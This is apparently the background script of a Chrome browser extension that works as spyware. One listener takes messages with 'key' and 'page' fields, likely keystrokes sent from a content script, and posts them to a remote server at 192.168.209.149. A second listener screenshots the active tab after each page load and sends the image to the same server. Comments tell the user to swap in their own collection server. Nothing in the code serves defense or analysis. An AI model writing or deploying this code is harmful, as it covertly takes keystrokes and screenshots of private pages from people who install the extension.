chrome.runtime.onMessage.addListener((data, sender, sendResponse) => {
  // Use URLSearchParams to encode the data as form data
  var formData = new URLSearchParams();
  formData.append("key", data.key);
  formData.append("page", data.page);
  // send to the remote server
  // change http://192.168.209.149/ to the remote server
  fetch("http://192.168.209.149/", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.text())
      .then((text) => {
        sendResponse({ message: text });
      })
      .catch((error) => {
        console.error("Error:", error);
        sendResponse({ error: error.message });
      });
  return true; // to keep the message channel open until sendResponse is called
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active) {
      // capture the web page
      chrome.tabs.captureVisibleTab(null, {format: 'png'}, function(dataUrl) {
        var formData = new URLSearchParams();
        formData.append("screenshot", dataUrl);
        // change http://192.168.209.149/ to the remote server
        fetch("http://192.168.209.149/", {
          method: "POST",
          body: formData,
        })
      });
  }
});
